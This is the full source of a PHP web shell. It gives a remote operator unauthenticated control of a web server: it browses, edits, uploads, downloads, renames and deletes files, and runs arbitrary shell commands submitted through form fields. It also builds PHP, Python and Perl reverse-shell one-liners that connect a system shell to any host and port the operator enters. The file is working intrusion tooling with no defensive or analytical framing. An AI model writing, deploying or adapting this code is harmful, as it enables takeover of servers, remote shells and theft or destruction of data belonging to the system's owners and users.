<?php
$dir = isset($_GET['path']) ? $_GET['path'] : getcwd();
chdir($dir);

function listFiles($dir) {
    $files = array_diff(scandir($dir), ['.', '..']);
    foreach ($files as $file) {
        $path = "$dir/$file";
        $isDir = is_dir($path);
        $size = $isDir ? 'DIR' : round(filesize($path) / 1024, 3) . 'KB';
        $encodedPath = urlencode(realpath($path));
        $displayName = strlen($file) > 30 ? htmlspecialchars(substr($file, 0, 27)) . '...' : htmlspecialchars($file);
        $action = $isDir
            ? "<a href='?path=$encodedPath' title='Open Dir'><i class='fas fa-folder'></i></a>"
            : "";
        $action .= " <a href='?edit=$encodedPath' title='Edit'><i class='fas fa-edit'></i></a>
                     <a href='?rename=$encodedPath' class='ml-4' title='Rename'><i class='fas fa-i-cursor'></i></a>
                     <a href='?download=$encodedPath' class='ml-4' title='Download'><i class='fas fa-download'></i></a>
                     <a href='?del=$encodedPath' class='ml-4' title='Delete'><i class='fas fa-trash-alt'></i></a>";
        echo "<tr class='bg-gray-700 text-2xl border border-gray-600'>
                <td class='p-4 border border-gray-600' title='$file'>$displayName</td>
                <td class='p-4 border border-gray-600'>$size</td>
                <td class='p-4 border border-gray-600 text-right'>$action</td>
              </tr>";
    }
}

if (isset($_POST['cmd'])) {
    echo "<pre class='bg-black text-green-400 p-4 mb-6 rounded border border-green-600 text-xl overflow-auto'>" . htmlspecialchars(shell_exec($_POST['cmd'])) . "</pre>";
}

if (isset($_POST['run_gs']) && isset($_POST['gs_command'])) {
    $cmd = $_POST['gs_command'];
    echo "<pre class='bg-black text-red-400 p-4 mb-6 rounded border border-red-600 text-xl overflow-auto'>" . htmlspecialchars(shell_exec($cmd)) . "</pre>";
}

if (isset($_POST['upload']) && isset($_FILES['upload'])) {
    $name = $_FILES['upload']['name'];
    move_uploaded_file($_FILES['upload']['tmp_name'], $name);
}

if (isset($_POST['newfile']) && $_POST['newfile'] !== '') file_put_contents($_POST['newfile'], '');
if (isset($_POST['newfolder']) && $_POST['newfolder'] !== '') mkdir($_POST['newfolder']);

if (isset($_GET['del'])) {
    $target = $_GET['del'];
    if (is_file($target)) unlink($target);
    elseif (is_dir($target)) rmdir($target);
    header("Location: ?path=" . urlencode(dirname($target)));
    exit;
}

if (isset($_GET['download'])) {
    $target = $_GET['download'];
    if (is_file($target)) {
        header('Content-Description: File Transfer');
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="' . basename($target) . '"');
        header('Content-Length: ' . filesize($target));
        readfile($target);
        exit;
    }
}

if (isset($_GET['edit']) && file_exists($_GET['edit'])) {
    $f = $_GET['edit'];
    $content = htmlspecialchars(file_get_contents($f));
    echo <<<HTML
<html><head><meta charset="UTF-8"><title>Edit File</title><script src="https://cdn.tailwindcss.com"></script></head>
<body class="bg-gray-800 text-white font-mono text-3xl p-10">
<form method="POST">
    <h2 class="text-4xl mb-6">Editing: $f</h2>
    <textarea name="savefile" rows="20" class="w-full bg-gray-900 text-white p-4 rounded border border-gray-600">$content</textarea>
    <input type="hidden" name="filename" value="$f">
    <button class="mt-6 bg-green-600 px-8 py-3 rounded text-2xl border border-green-800" type="submit">Save</button>
    <a href="?path={$dir}" class="ml-8 text-red-400 text-2xl">Cancel</a>
</form>
</body></html>
HTML;
    exit;
}

if (isset($_POST['savefile'], $_POST['filename'])) {
    file_put_contents($_POST['filename'], $_POST['savefile']);
}

if (isset($_GET['rename']) && file_exists($_GET['rename'])) {
    $f = $_GET['rename'];
    echo <<<HTML
<html><head><meta charset="UTF-8"><title>Rename File</title><script src="https://cdn.tailwindcss.com"></script></head>
<body class="bg-gray-800 text-white font-mono text-3xl p-10">
<form method="POST">
    <h2 class="text-4xl mb-6">Renaming: $f</h2>
    <input type="hidden" name="rename_from" value="$f">
    <input type="text" name="rename_to" class="w-full p-4 rounded bg-gray-100 text-black text-2xl border border-gray-600" value="$f">
    <button class="mt-6 bg-yellow-500 px-8 py-3 rounded text-2xl border border-yellow-700" type="submit">Rename</button>
    <a href="?path={$dir}" class="ml-8 text-red-400 text-2xl">Cancel</a>
</form>
</body></html>
HTML;
    exit;
}

if (isset($_POST['rename_from'], $_POST['rename_to'])) {
    rename($_POST['rename_from'], $_POST['rename_to']);
}

if (isset($_POST['connect']) && isset($_POST['method']) && isset($_POST['host']) && isset($_POST['port'])) {
    $host = $_POST['host'];
    $port = $_POST['port'];
    $method = $_POST['method'];
    if ($method === 'php') {
        $cmd = "php -r \"\$sock=fsockopen('$host',$port);exec('/bin/sh -i <&3 >&3 2>&3');\"";
    } elseif ($method === 'python') {
        $cmd = "python -c \"import socket,subprocess,os;s=socket.socket();s.connect(('{$host}',{$port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);subprocess.call(['/bin/sh'])\"";
    } elseif ($method === 'perl') {
        $cmd = "perl -e \"use Socket;\$i='$host';\$p=$port;socket(S,PF_INET,SOCK_STREAM,getprotobyname('tcp'));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,'>&S');open(STDOUT,'>&S');open(STDERR,'>&S');exec('/bin/sh -i');};\"";
    }
    echo "<pre class='bg-black text-yellow-400 p-4 mb-6 rounded border border-yellow-600 text-xl overflow-auto'>" . htmlspecialchars(shell_exec($cmd)) . "</pre>";
}

?>
